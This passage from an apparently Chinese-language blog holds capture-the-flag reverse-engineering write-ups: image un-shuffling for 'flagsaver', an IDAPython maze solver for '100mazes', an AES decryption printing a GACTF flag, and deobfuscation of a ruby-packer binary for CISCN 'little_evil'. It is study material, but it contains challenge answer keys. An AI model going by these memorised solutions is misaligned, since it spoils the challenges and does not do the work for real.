Graphics.FromImage(array[num3]);</span><br><span class="line">			graphics.DrawImage(this.screenCapture, new Rectangle(0, 0, num, num2), new Rectangle(i * num, j * num2, num, num2), GraphicsUnit.Pixel);</span><br><span class="line">			graphics.Dispose();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	array &#x3D; this.ShuffleArray(array);</span><br><span class="line">	Graphics graphics2 &#x3D; Graphics.FromImage(this.jigsaw);</span><br><span class="line">	for (int k &#x3D; 0; k &lt; this.pieces; k++)</span><br><span class="line">	&#123;</span><br><span class="line">		for (int l &#x3D; 0; l &lt; this.pieces; l++)</span><br><span class="line">		&#123;</span><br><span class="line">			int num4 &#x3D; k * this.pieces + l;</span><br><span class="line">			graphics2.DrawImage(array[num4], k * num, l * num2);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	graphics2.Dispose();</span><br><span class="line">	this.imageControl.Image &#x3D; this.jigsaw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>this.screenCapture永远不变，变的只有 array </p>
<p>写脚本恢复（不知道为什么恢复不完全，但是可以猜到flag）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&quot;D:\0Study3\OMH_2021_CTF\0afa401129bd7379e8795431723e42f4eab6ed71bedc1ec2a3647ee2273869bf_flagsaver\flagsaver\for_players\screenshot.png&quot;</span>)</span><br><span class="line">print(img.width,img.height)</span><br><span class="line">x,y,z = img.getpixel((<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">print(x,y,z)</span><br><span class="line">print(img.getpixel((<span class="number">0</span>,<span class="number">0</span>)))</span><br><span class="line">piece = <span class="number">120</span></span><br><span class="line">width = <span class="number">1920</span>//<span class="number">120</span></span><br><span class="line">height = <span class="number">1080</span>//<span class="number">120</span></span><br><span class="line">imgarray_init = [img.crop((x, y, x+piece, y+piece)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.size[<span class="number">0</span>], width) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.size[<span class="number">1</span>], height)]</span><br><span class="line"></span><br><span class="line">seed = <span class="number">51966</span></span><br><span class="line"><span class="comment"># seed =  (57005 * seed + 48879) % 128</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span>():</span></span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed =  (<span class="number">57005</span> * seed + <span class="number">48879</span>) % <span class="number">65537</span></span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line">array = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(piece):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(piece):</span><br><span class="line">        array.append((i,j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = piece*piece</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle</span>():</span></span><br><span class="line">    list1 = []</span><br><span class="line">    list2 = []</span><br><span class="line">    lcg()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(piece):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(piece):</span><br><span class="line">            num2 = lcg() % num</span><br><span class="line">            num3 = lcg() % num</span><br><span class="line">            list1.append(num2)</span><br><span class="line">            list2.append(num3)</span><br><span class="line">    <span class="keyword">return</span> list1,list2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">list1,list2,n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        print(list1)</span><br><span class="line">    imgarray = imgarray_init.copy()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list1)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        imgarray[list1[i]],imgarray[list2[i]] = imgarray[list2[i]],imgarray[list1[i]]</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">1920</span>, <span class="number">1080</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(imgarray)):</span><br><span class="line">        im.paste(imgarray[i],((i // piece) * width, (i % piece) * height))</span><br><span class="line">    im.save(<span class="string">r&quot;D:\0Study3\OMH_2021_CTF\0afa401129bd7379e8795431723e42f4eab6ed71bedc1ec2a3647ee2273869bf_flagsaver\flagsaver\for_players\result\result_&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(n))</span><br><span class="line"><span class="comment"># print(array)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    list1,list2 = shuffle()</span><br><span class="line">    recover(list1,list2,i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(im.width,im.height)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># im.show()</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-05/20210523004931.png"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/23/MTCTF2021-100mazes/">MTCTF2021-100mazes</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/reverse/">reverse</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/idaPython/">idaPython</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/maze/">maze</a></span><div class="content"><p>走100个迷宫就算成功</p>
<p>自动走迷宫脚本，主要是一个递归，深度优先算法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passable</span>(<span class="params">maze, pos,alreadly,table1</span>):</span>  <span class="comment"># 检查迷宫maze的位置pos是否可通行</span></span><br><span class="line">    <span class="keyword">if</span> pos <span class="keyword">in</span> alreadly:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> table1[<span class="number">25</span> * pos[<span class="number">0</span>] + pos[<span class="number">1</span>]] ^ maze[<span class="number">25</span> * pos[<span class="number">0</span>] + pos[<span class="number">1</span>]] == <span class="number">46</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_path</span>(<span class="params">maze, pos, end,time,alreadly,table1,path,path2</span>):</span></span><br><span class="line">    dirs = [(<span class="number">0</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, -<span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>)] </span><br><span class="line">    alreadly.append(pos)</span><br><span class="line">    <span class="keyword">if</span> time == <span class="number">15</span>:</span><br><span class="line">        print(pos, end=<span class="string">&quot; &quot;</span>)  <span class="comment"># 已到达出口，输出这个位置。成功结束</span></span><br><span class="line">        path.append(pos)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):  <span class="comment"># 否则按四个方向顺序检查</span></span><br><span class="line">        nextp = pos[<span class="number">0</span>] + dirs[i][<span class="number">0</span>], pos[<span class="number">1</span>] + dirs[i][<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 考虑下一个可能方向</span></span><br><span class="line">        <span class="keyword">if</span> passable(maze, nextp,alreadly,table1):  <span class="comment"># 不可行的相邻位置不管</span></span><br><span class="line">            <span class="keyword">if</span> find_path(maze, nextp, end,time + <span class="number">1</span>,alreadly.copy(),table1,path,path2):  <span class="comment"># 如果从nextp可达出口，输出这个位置，成功结束</span></span><br><span class="line">                print(pos, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">                path.append(pos)</span><br><span class="line">                path2.append(i)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">maze,table1,x,y</span>):</span></span><br><span class="line">     <span class="comment"># 当前位置四个方向的偏移量</span></span><br><span class="line">    path = []  <span class="comment"># 存找到的路径</span></span><br><span class="line">    path2 = []</span><br><span class="line">    char1 = table1[-<span class="number">4</span>:]</span><br><span class="line">    start = (x,y)</span><br><span class="line">    end = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    find_path(maze, start, end , <span class="number">0</span>,[],table1,path,path2)</span><br><span class="line">    print()</span><br><span class="line">    path2 = path2[::-<span class="number">1</span>]</span><br><span class="line">    print(path2)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(path2)):</span><br><span class="line">        <span class="keyword">if</span> path2[i] == <span class="number">0</span>:</span><br><span class="line">            s += <span class="built_in">chr</span>(char1[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">if</span> path2[i] == <span class="number">1</span>:</span><br><span class="line">            s += <span class="built_in">chr</span>(char1[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> path2[i] == <span class="number">2</span>:</span><br><span class="line">            s += <span class="built_in">chr</span>(char1[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> path2[i] == <span class="number">3</span>:</span><br><span class="line">            s += <span class="built_in">chr</span>(char1[<span class="number">0</span>])</span><br><span class="line">    print(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提取ida静态数据，利用idaPython脚本，利用 指令的机器码进行识别</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumptable</span>(<span class="params">s,e</span>):</span> </span><br><span class="line">    table = [] </span><br><span class="line">    maze = [] </span><br><span class="line">    pos = [] </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s,e,<span class="number">1</span>): </span><br><span class="line">        <span class="keyword">if</span>(idaapi.get_wide_word(i) == <span class="number">0x85c6</span>): </span><br><span class="line">            table.append(idc.get_operand_value(i,<span class="number">1</span>)) </span><br><span class="line">            i+=<span class="number">7</span> </span><br><span class="line">        <span class="keyword">elif</span>(idaapi.get_wide_word(i) == <span class="number">0x8d48</span> <span class="keyword">and</span> idc.get_operand_type(i,<span class="number">1</span>)==<span class="number">2</span>): </span><br><span class="line">            const_table_addr = idc.get_operand_value(i,<span class="number">1</span>) </span><br><span class="line">            print(const_table_addr)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">625</span>): </span><br><span class="line">                maze.append(idaapi.get_dword(<span class="number">4</span>*j+const_table_addr)) </span><br><span class="line">        <span class="keyword">elif</span>(idaapi.get_wide_word(i) == <span class="number">0x85c7</span>): </span><br><span class="line">            pos.append(idc.get_operand_value(i,<span class="number">1</span>)) </span><br><span class="line">    <span class="keyword">return</span> table,maze,pos </span><br><span class="line"> </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmaze</span>():</span> </span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) </span><br><span class="line">    start = <span class="number">0x000A6AA8</span> </span><br><span class="line">    end = <span class="number">0x00A736F</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start,end,<span class="number">1</span>): </span><br><span class="line">        <span class="keyword">if</span>(idaapi.get_byte(i) == <span class="number">0xE8</span>): </span><br><span class="line">            func_addr = idc.get_operand_value(i,<span class="number">0</span>) </span><br><span class="line">            <span class="keyword">if</span>(func_addr == <span class="number">0x640</span>): </span><br><span class="line">                i+=<span class="number">5</span> </span><br><span class="line">                <span class="keyword">continue</span> </span><br><span class="line">             </span><br><span class="line">            name = idc.get_func_name(func_addr) </span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;maze&quot;</span> <span class="keyword">in</span> name): </span><br><span class="line">                end_addr = ida_funcs.get_func(func_addr).end_ea </span><br><span class="line">                t,m,start = dumptable(func_addr,end_addr) </span><br><span class="line">                f.write(name + <span class="string">&quot;_table = &quot;</span>) </span><br><span class="line">                f.write(<span class="built_in">str</span>(t)) </span><br><span class="line">                f.write(<span class="string">&quot;\n&quot;</span>) </span><br><span class="line">                print(name,func_addr,end_addr,<span class="built_in">len</span>(t),<span class="built_in">len</span>(m),<span class="string">&quot;[+]start:&quot;</span>,start[<span class="number">0</span>],start[<span class="number">1</span>]) </span><br><span class="line">                solve(m,t,start[<span class="number">1</span>],start[<span class="number">0</span>])</span><br><span class="line">                <span class="comment">#print(m)</span></span><br><span class="line">                <span class="comment">#print(t)</span></span><br><span class="line">                </span><br><span class="line">            i+=<span class="number">5</span> </span><br><span class="line">        </span><br><span class="line">findmaze() </span><br></pre></td></tr></table></figure>
<p>get_operand_value获取真正的偏移地址</p>
<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/17/1124/16/11400509_706781196.shtml">http://www.360doc.com/content/17/1124/16/11400509_706781196.shtml</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/22/CISCN-2021-little-evil/">CISCN 2021 little_evil</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/reverse/">reverse</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ruby/">ruby</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/vm/">vm</a></span><div class="content"><p>ruby程序逆向让我想起了GACTF 2020 Checkin，回顾一下</p>
<h2 id="GACTF-2020-Checkin"><a href="#GACTF-2020-Checkin" class="headerlink" title="GACTF 2020 Checkin"></a>GACTF 2020 Checkin</h2><p>首先要确定这个程序是什么语言写的？</p>
<p>C，C++，Python，Ruby，GO，JAVA，Rust</p>
<p>如果是脚本语言，那要了解是什么打包的</p>
<p>pyinstaller，OCRA</p>
<p>如何确定？看程序特性，google 特征字符串 </p>
<p>图标红宝石，很可能Ruby，Google  ocra 了解一下这些是什么</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/phoenix0619/article/details/83250627">https://blog.csdn.net/phoenix0619/article/details/83250627</a></p>
<p>可以知道是ocra打包的exe运行时将源码释放到一个临时目录后执行</p>
<p>ProcessMonitor 定义Fliter Process Name is Checkin.exe，定义 Operator is CreateFile</p>
<p>可以看到程序调用的API</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-05/20210521231130.png"></p>
<p>本题较简单，OD调试会显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FATAL ERROR: Failed to create process (C:\Users\hwf\AppData\Local\Temp\ocr11E4.tmp\bin\ruby.exe): 50</span><br></pre></td></tr></table></figure>
<p>这就是个提示了，我考虑的是如果没有这个提示的时候该怎么做</p>
<p>找到rb脚本剩下的就简单了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from Crypto.Cipher import AES</span><br><span class="line">&gt;&gt;&gt; key &#x3D; b&quot;Welcome_To_GACTF&quot;</span><br><span class="line">&gt;&gt;&gt; cipher &#x3D; &quot;4KeC&#x2F;Oj1McI4TDIM2c9Y6ahahc6uhpPbpSgPWktXFLM&#x3D;&quot;</span><br><span class="line">&gt;&gt;&gt; aes &#x3D; AES.new(key,AES.MODE_ECB)</span><br><span class="line">&gt;&gt;&gt; aes.decrypt(base64.b64decode(cipher))</span><br><span class="line">b&#39;GACTF&#123;Have_a_wonderful_time!&#125;\x03\x03\x03&#39;</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2021-little-evil"><a href="#CISCN-2021-little-evil" class="headerlink" title="CISCN 2021 little_evil"></a>CISCN 2021 little_evil</h2><p>程序字符串很多ruby开头的字符，可以确定是ruby脚本打包成ELF文件</p>
<p>ida发现了有关ruby的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;rubyc&#x2F;ruby-2.4.1-0.4.0&#x2F;build&#x2F;lib</span><br></pre></td></tr></table></figure>
<p>google搜一下关键字找到了ruby packer的github，<a target="_blank" rel="noopener" href="https://github.com/pmq20/ruby-packer%EF%BC%8C%E9%98%85%E8%AF%BB%E5%85%B6readme%E6%96%87%E4%BB%B6">https://github.com/pmq20/ruby-packer，阅读其readme文件</a></p>
<p>可以发现 rubyc 是 ruby packer 的可执行文件ELF，所以这个文件应该是ruby packer打包的</p>
<p>ruby packer 似乎是基于squashfs的</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-05/20210522095417.png"></p>
<p>在ida 字符串窗口也找到了squashfs的字符串</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-05/20210522095214.png"></p>
<p>什么是 squashfs，去维基百科看，<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SquashFS">https://en.wikipedia.org/wiki/SquashFS</a></p>
<blockquote>
<p><strong>Squashfs</strong> is a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Data_compression">compressed</a> read-only <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/File_system">file system</a> for <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linux">Linux</a>. Squashfs compresses <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computer_file">files</a>, <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Inode">inodes</a> and <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Directory_(file_systems)">directories</a>, and supports <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Block_size_(data_storage_and_transmission)">block sizes</a> from 4 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kibibyte">KiB</a> up to 1 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Mebibyte">MiB</a> for greater compression</p>
</blockquote>
<p>压缩的只读的 Linux 文件系统，可以猜测Ruby打包是把源文件压缩为squashfs放入到Ruby解释器中</p>
<p>提取squashfs，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sherlock-merlin/p/9310390.html">https://www.cnblogs.com/sherlock-merlin/p/9310390.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me  .&#x2F;little_evil</span><br></pre></td></tr></table></figure>
<p>可以得到 out.rb，源代码，被混淆过，那现在的问题就是怎么去混淆，脚本自动化</p>
<p>首先要把ruby格式化，类似于js的格式化，去网上找就可以了</p>
<p>格式化后发现程序逻辑意外简单，定义十几个函数，然后一直调用，最后调用一个send函数，应该是执行函数，在send函数前加一句puts，让我们看看它到底执行了什么，发现他执行的语句又是这样一个结构，重复上面的puts方法，最后得到这样的源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">evalbegin $_&#x3D;$$&#x2F;$$;@_&#x3D;$_+$_;$-_&#x3D;$_-@_</span><br><span class="line">$__&#x3D;-&gt;_&#123;_&#x3D;&#x3D;[]||_&#x3D;&#x3D;&#39;&#39;?$.:$_+$__[_[$_..$-_]]&#125;</span><br><span class="line">@__&#x3D;-&gt;_,&amp;__&#123;_&#x3D;&#x3D;[]?[]:[__[_[$.]]]+@__[_[$_..$-_],&amp;__]&#125;</span><br><span class="line">$_____&#x3D;-&gt;_&#123;@__[[*_],&amp;-&gt;__&#123;__[$.]&#125;]&#125;</span><br><span class="line">@_____&#x3D;-&gt;_&#123;@__[[*_],&amp;-&gt;__&#123;__[$-_]&#125;]&#125;</span><br><span class="line">$______&#x3D;-&gt;_&#123;___,______&#x3D;$_____[_],@_____[_];_____&#x3D;$__[___];____&#x3D;&#123;&#125;;__&#x3D;$.;(_&#x3D;-&gt;&#123;</span><br><span class="line">  ____[______[__]]&#x3D;___[__];(__+&#x3D;$_)&#x3D;&#x3D;_____ ?____:_[]&#125;)[]&#125;</span><br><span class="line">@______&#x3D;-&gt;_,__&#123;_&#x3D;[*_]+[*__];____&#x3D;$__[_];___&#x3D;&#123;&#125;;__&#x3D;$.;(_____&#x3D;-&gt;&#123;</span><br><span class="line">  ___[_[__][$.]]&#x3D;_[__][$_];(__+&#x3D;$_)&#x3D;&#x3D;____ ?___:_____[]&#125;)[]&#125;</span><br><span class="line">$_______&#x3D;-&gt;_&#123;$___&#x3D;[];@___&#x3D;$__[_];__&#x3D;___&#x3D;____&#x3D;$.;$____,@____&#x3D;&#123;&#125;,[]</span><br><span class="line">(_____&#x3D;-&gt;&#123;</span><br><span class="line">  _[____]&#x3D;&#x3D;&#39;5&#39;?(@____&lt;&lt;____):$.</span><br><span class="line">  _[____]&#x3D;&#x3D;&#39;6&#39;?($____[@____[$-_]]&#x3D;____;@____&#x3D;@____[$...$.-@_]):$.</span><br><span class="line">  (____+&#x3D;$_)&#x3D;&#x3D;@___?$.:_____[]&#125;)[]</span><br><span class="line">$____&#x3D;$____&#x3D;&#x3D;&#123;&#125;?&#123;&#125;:@______[$____,$______[$____]]</span><br><span class="line">(______&#x3D;-&gt;&#123;_[__]&#x3D;&#x3D;</span><br><span class="line">&#39;0&#39;?($___[___]||&#x3D;$.;$___[___]+&#x3D;$_):_[__]&#x3D;&#x3D;</span><br><span class="line">&#39;1&#39;?($___[___]||&#x3D;$.;$___[___]-&#x3D;$_):_[__]&#x3D;&#x3D;</span><br><span class="line">&#39;2&#39;?($___[___]||&#x3D;$.;$___[___]&#x3D;STDIN.getc.ord):_[__]&#x3D;&#x3D;</span><br><span class="line">&#39;3&#39;?(___+&#x3D;$_):_[__]&#x3D;&#x3D;</span><br><span class="line">&#39;4&#39;?(___-&#x3D;$_):_[__]&#x3D;&#x3D;</span><br><span class="line">&#39;5&#39;?(__&#x3D;($___[___]||$.)&#x3D;&#x3D;$.?$____[__]:__):_[__]&#x3D;&#x3D;</span><br><span class="line">&#39;6&#39;?(__&#x3D;($___[___]||$.)!&#x3D;$.?$____[__]:__):_[__]&#x3D;&#x3D;</span><br><span class="line">&#39;7&#39;?($&gt;&lt;&lt;(&#39;&#39;&lt;&lt;$___[___])):$.</span><br><span class="line">(__+&#x3D;$_)&#x3D;&#x3D;@___?_:______[]&#125;)[]&#125;</span><br><span class="line">puts</span><br><span class="line">$_______[&#39;3351635164300000000540000000003164073000000540000003164070070000071730000000541111111131641175160343516445163530440316354031643451634235163516000000054000000000003164344354131645335163435164444516333530444403331635403164344451665163423516351600000054000000000316413443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000316403443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000031640344354131645335163435164444516333530444403331635403164344451665163423516351600000540000000000031643443541316453351634351644445163335304444033316354031643444516651635164453030441633544033164533516351643000000005400000000003164171111744516644&#39;];rescue Exception;end</span><br></pre></td></tr></table></figure>
<p> 配置好ruby环境让他运行起来</p>
<p>类似于JSFUCK，js混淆可以看这个<a target="_blank" rel="noopener" href="https://examine2.top/2020/02/12/JS%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/">https://examine2.top/2020/02/12/JS%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</a></p>
<p>通过puts 变量可以知道一些值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">begin $_&#x3D;$$&#x2F;$$;@_&#x3D;$_+$_;</span><br><span class="line">puts $_;</span><br><span class="line">puts @_;</span><br><span class="line">$-_&#x3D;$_-@_</span><br><span class="line">puts $-_;</span><br></pre></td></tr></table></figure>
<p>写脚本恢复名称，主要运用正则表达式，<a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python3-reg-expressions.html">https://www.runoob.com/python3/python3-reg-expressions.html</a></p>
